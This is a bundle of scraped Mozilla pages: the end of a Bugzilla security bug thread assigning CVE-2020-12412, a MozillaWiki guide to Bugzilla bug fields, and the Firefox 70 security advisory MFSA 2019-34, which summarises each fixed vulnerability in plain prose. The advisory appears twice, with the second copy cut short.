|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a34003227_1689)• 5 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a34374921_1689)• 5 years ago |

Group: dom-core-security → core-security-release

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=1528587#c54)• 5 years ago |
|  | |

I need to update or otherwise handle the historical advisory for this.

Flags: needinfo?(tom)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=1528587#c55)• 5 years ago |
|  | |

We've assigned [CVE-2020-12412](https://www.cve.org/CVERecord?id=CVE-2020-12412), updated <https://www.mozilla.org/en-US/security/advisories/mfsa2019-34/> The HoF entry will be added during the Q1 update which I hope to do in the next week.

Alias: CVE-2020-12412Flags: needinfo?(tom)

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=1528587#c56)• 5 years ago |
|  | |

Removing employee no longer with company from CC list of private bugs.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a57965372_1689)• 4 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1528587#a166713871_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1528587&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Adrian](/user_profile?user_id=633720)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wiki.mozilla.org_73f8d6fa_20250119_133802.html ===


# BMO/UserGuide/BugFields

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from www.mozilla.org_8922780a_20250119_115219.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-34

## Security vulnerabilities fixed in - Firefox 70

Announced
October 22, 2019
Impact
critical
Products
Firefox
Fixed in

* Firefox 70

**Note:** We have updated this advisory on June 26, 2020 to include CVE-2020-12412 and on March 20, 2023 to include CVE-2019-25136, which were fixed in Firefox 70 but not recognized or acknowledged immediately.

#### [#CVE-2018-6156: Heap buffer overflow in FEC processing in WebRTC](#CVE-2018-6156)

Reporter
Google Project Zero
Impact
high
##### Description

Incorrect derivation of a packet length in WebRTC caused heap corruption via a crafted video file. This resulted in a potentially exploitable crash.

##### References

* [Bug 1480088](https://bugzilla.mozilla.org/show_bug.cgi?id=1480088)

#### [#CVE-2019-15903: Heap overflow in expat library in XML\_GetCurrentLineNumber](#CVE-2019-15903)

Reporter
Sebastian Pipping
Impact
high
##### Description

In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early. A subsequent call to `XML_GetCurrentLineNumber` or `XML_GetCurrentColumnNumber` then resulted in a heap-based buffer over-read.

##### References

* [Bug 1584907](https://bugzilla.mozilla.org/show_bug.cgi?id=1584907)

#### [#CVE-2019-11757: Use-after-free when creating index updates in IndexedDB](#CVE-2019-11757)

Reporter
Zhanjia Song
Impact
high
##### Description

When storing a value in IndexedDB, the value's prototype chain is followed and it was possible to retain a reference to a locale, delete it, and subsequently reference it. This resulted in a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1577107](https://bugzilla.mozilla.org/show_bug.cgi?id=1577107)

#### [#CVE-2019-25136: Invalid styles allowed from content processes](#CVE-2019-25136)

Reporter
Emilio Cobos Álvarez
Impact
high
##### Description

A compromised child process could have injected XBL Bindings into privileged CSS rules, resulting in arbitrary code execution and a sandbox escape.

##### References

* [Bug 1530709](https://bugzilla.mozilla.org/show_bug.cgi?id=1530709)

#### [#CVE-2020-12412: Address bar spoof using history navigation and blocked ports](#CVE-2020-12412)

Reporter
Adrian Karolak from ING Tech Poland
Impact
moderate
##### Description

By navigating a tab using the history API, an attacker could cause the address bar to display the incorrect domain (with the https:// scheme, a blocked port number such as '1', and without a lock icon) while controlling the page contents.

##### References

* [Bug 1528587](https://bugzilla.mozilla.org/show_bug.cgi?id=1528587)

#### [#CVE-2019-11759: Stack buffer overflow in HKDF output](#CVE-2019-11759)

Reporter
Guido Vranken
Impact
moderate
##### Description

An attacker could have caused 4 bytes of HMAC output to be written past the end of a buffer stored on the stack. This could be used by an attacker to execute arbitrary code or more likely lead to a crash.

##### References

* [Bug 1577953](https://bugzilla.mozilla.org/show_bug.cgi?id=1577953)

#### [#CVE-2019-11760: Stack buffer overflow in WebRTC networking](#CVE-2019-11760)

Reporter
Nils
Impact
moderate
##### Description

A fixed-size stack buffer could overflow in nrappkit when doing WebRTC signaling. This resulted in a potentially exploitable crash in some instances.

##### References

* [Bug 1577719](https://bugzilla.mozilla.org/show_bug.cgi?id=1577719)

#### [#CVE-2019-11761: Unintended access to a privileged JSONView object](#CVE-2019-11761)

Reporter
Cody Crews
Impact
moderate
##### Description

By using a form with a data URI it was possible to gain access to the privileged `JSONView` object that had been cloned into content. Impact from exposing this object appears to be minimal, however it was a bypass of existing defense in depth mechanisms.

##### References

* [Bug 1561502](https://bugzilla.mozilla.org/show_bug.cgi?id=1561502)

#### [#CVE-2019-11762: document.domain-based origin isolation has same-origin-property violation](#CVE-2019-11762)

Reporter
Kris Maglione
Impact
moderate
##### Description

If two same-origin documents set document.domain differently to become cross-origin, it was possible for them to call arbitrary DOM methods/getters/setters on the now-cross-origin window.

##### References

* [Bug 1582857](https://bugzilla.mozilla.org/show_bug.cgi?id=1582857)

#### [#CVE-2019-11763: Incorrect HTML parsing results in XSS bypass technique](#CVE-2019-11763)

Reporter
Gareth Heyes
Impact
moderate
##### Description

Failure to correctly handle null bytes when processing HTML entities resulted in Firefox incorrectly parsing these entities. This could have led to HTML comment text being treated as HTML which could have led to XSS in a web application under certain conditions. It could have also led to HTML entities being masked from filters, enabling the use of entities to mask the actual characters of interest from filters.

##### References

* [Bug 1584216](https://bugzilla.mozilla.org/show_bug.cgi?id=1584216)

#### [#CVE-2019-11765: Incorrect permissions could be granted to a website](#CVE-2019-11765)

Reporter
Paul Theriault
Impact
moderate
##### Description

A compromised content process could send a message to the parent process that would cause the 'Click to Play' permission prompt to be shown. However, due to lack of validation from the parent process, if the user accepted the permission request an attacker-controlled permission would be granted rather than the 'Click to Play' permission.

##### References

* [Bug 1562582](https://bugzilla.mozilla.org/show_bug.cgi?id=1562582)

#### [#CVE-2019-17000: CSP bypass using object tag with data: URI](#CVE-2019-17000)

Reporter
Yangzheng Li
Impact
moderate
##### Description

An object tag with a data URI did not correctly inherit the document's Content Security Policy. This allowed a CSP bypass in a cross-origin frame if the document's policy explicitly allowed `data:` URIs.

##### References

* [Bug 1441468](https://bugzilla.mozilla.org/show_bug.cgi?id=1441468)

#### [#CVE-2019-17001: CSP bypass using object tag when script-src 'none' is specified](#CVE-2019-17001)

Reporter
Matheus Vrech
Impact
moderate
##### Description

A Content-Security-Policy that blocks in-line scripts could be bypassed using an object tag to execute JavaScript in the protected document (cross-site scripting). This is a separate bypass from CVE-2019-17000.
*Note: This flaw only affected Firefox 69 and was not present in earlier versions.*

##### References

* [Bug 1587976](https://bugzilla.mozilla.org/show_bug.cgi?id=1587976)

#### [#CVE-2019-17002: upgrade-insecure-requests was not being honored for links dragged and dropped](#CVE-2019-17002)

Reporter
Kevin Brosnan
Impact
low
##### Description

If `upgrade-insecure-requests` was specified in the Content Security Policy, and a link was dragged and dropped from that page, the link was not upgraded to https.

##### References

* [Bug 1561056](https://bugzilla.mozilla.org/show_bug.cgi?id=1561056)

#### [#CVE-2019-11764: Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](#CVE-2019-11764)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Jason Kratzer, Aaron Klotz, Iain Ireland, Tyson Smith, Christian Holler, Steve Fink, Honza Bambas, Byron Campen, and Cristian Brindusan reported memory safety bugs present in Firefox 69 and Firefox ESR 68.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1558522%2C1577061%2C1548044%2C1571223%2C1573048%2C1578933%2C1575217%2C1583684%2C1586845%2C1581950%2C1583463%2C1586599)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_468ffb4f_20250119_133802.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-34

## Security vulnerabilities fixed in - Firefox 70

Announced
October 22, 2019
Impact
critical
Products
Firefox
Fixed in

* Firefox 70

**Note:** We have updated this advisory on June 26, 2020 to include CVE-2020-12412 and on March 20, 2023 to include CVE-2019-25136, which were fixed in Firefox 70 but not recognized or acknowledged immediately.

#### [#CVE-2018-6156: Heap buffer overflow in FEC processing in WebRTC](#CVE-2018-6156)

Reporter
Google Project Zero
Impact
high
##### Description

Incorrect derivation of a packet length in WebRTC caused heap corruption via a crafted video file. This resulted in a potentially exploitable crash.

##### References

* [Bug 1480088](https://bugzilla.mozilla.org/show_bug.cgi?id=1480088)

#### [#CVE-2019-15903: Heap overflow in expat library in XML\_GetCurrentLineNumber](#CVE-2019-15903)

Reporter
Sebastian Pipping
Impact
high
##### Description

In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early. A subsequent call to `XML_GetCurrentLineNumber` or `XML_GetCurrentColumnNumber` then resulted in a heap-based buffer over-read.

##### References

* [Bug 1584907](https://bugzilla.mozilla.org/show_bug.cgi?id=1584907)

#### [#CVE-2019-11757: Use-after-free when creating index updates in IndexedDB](#CVE-2019-11757)

Reporter
Zhanjia Song
Impact
high
##### Description

